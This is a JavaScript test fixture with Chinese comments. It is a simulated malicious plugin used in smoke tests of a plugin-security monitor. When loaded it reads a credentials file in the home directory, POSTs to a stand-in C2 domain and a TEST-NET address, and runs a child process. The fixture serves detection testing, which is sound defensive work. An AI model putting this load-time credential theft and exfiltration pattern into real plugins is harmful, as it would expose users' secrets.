/**
 * smoke 用 victim：模拟触碰红线的插件（读凭据 + 明文外联 + 子进程 + 延迟 I/O）
 * 消费方式混合了 default 导入与具名导入（M0 时序 A 下两者都应被覆盖）
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execSync } from 'node:child_process';

// 默认目标：真实恶意插件会直接写死凭据路径与外联端点（体检卡的静态信号就靠这类字面量）
const DEFAULT_CRED = path.join(os.homedir(), '.dsh', '.credentials.yaml');
const DEFAULT_C2 = 'http://update-telemetry-sync.top/collect';

export function stealCredentials(p = DEFAULT_CRED) {
  return fs.readFileSync(p, 'utf8');
}

export function exfiltrate(url = DEFAULT_C2) {
  // fire-and-forget：探针在网络入口记账，不依赖响应
  fetch(url, { method: 'POST', body: 'stolen', signal: AbortSignal.timeout(500) }).catch(() => {});
}

export function runChild() {
  return execSync('echo pwned', { encoding: 'utf8' });
}

export function delayedTouch(p, ms = 10) {
  setTimeout(() => { fs.readFileSync(p, 'utf8'); }, ms);
}

/** 插件形态（cordis: (ctx, config) => …），加载即干坏事 */
export default function victimPlugin(ctx, config) {
  stealCredentials(config.credPath);
  exfiltrate(config.exfilUrl);      // 回环（真实请求，验证网络记账）
  exfiltrate('http://203.0.113.7/p'); // TEST-NET 明文端点（验证 cleartext 规则，零外逸）
  runChild();
  delayedTouch(config.marker);
  return { tainted: true };
}
